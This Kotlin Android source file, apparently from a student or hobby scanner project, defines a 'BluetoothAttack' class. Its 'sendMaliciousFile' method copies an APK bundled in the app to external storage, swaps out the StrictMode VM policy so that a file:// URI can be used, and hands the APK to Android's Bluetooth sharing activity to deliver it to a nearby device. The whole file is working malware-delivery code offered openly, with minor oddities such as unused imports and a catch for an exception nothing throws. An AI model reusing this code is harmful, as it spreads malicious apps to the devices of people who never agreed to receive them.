package com.wpam.scanner.attack

import android.content.Context
import com.wpam.scanner.db.Bluetooth
import java.io.File
import java.sql.Types.TIMESTAMP
import android.content.ContentValues
import android.os.Environment.getExternalStorageDirectory
import android.bluetooth.BluetoothDevice
import android.net.Uri
import android.os.Environment
import android.util.Log
import android.support.v4.content.ContextCompat.startActivity
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ApplicationInfo
import android.os.StrictMode


class BluetoothAttack(
    private val context: Context
) {
    fun sendMaliciousFile() {
        val builder = StrictMode.VmPolicy.Builder()
        StrictMode.setVmPolicy(builder.build())

        val res = context.resources
        val rId = res.getIdentifier("app", "raw", context.packageName)

        val inputStream = res.openRawResource(rId)

        val destApkPath = "${context.getExternalFilesDir(null)}/app.apk"
        inputStream.use {
            stream ->
            File(destApkPath).outputStream().use {
                stream.copyTo(it)
            }
        }

        try {
            val sendBt = Intent(Intent.ACTION_SEND)
            sendBt.type = "application/*"
            sendBt.putExtra(
                Intent.EXTRA_STREAM,
                Uri.parse("file://$destApkPath")
            )
            sendBt.setClassName(
                "com.android.bluetooth",
                "com.android.bluetooth.opp.BluetoothOppLauncherActivity"
            )
            startActivity(context, sendBt, null)
        } catch (e1: PackageManager.NameNotFoundException) {
            e1.printStackTrace()
        }
    }
}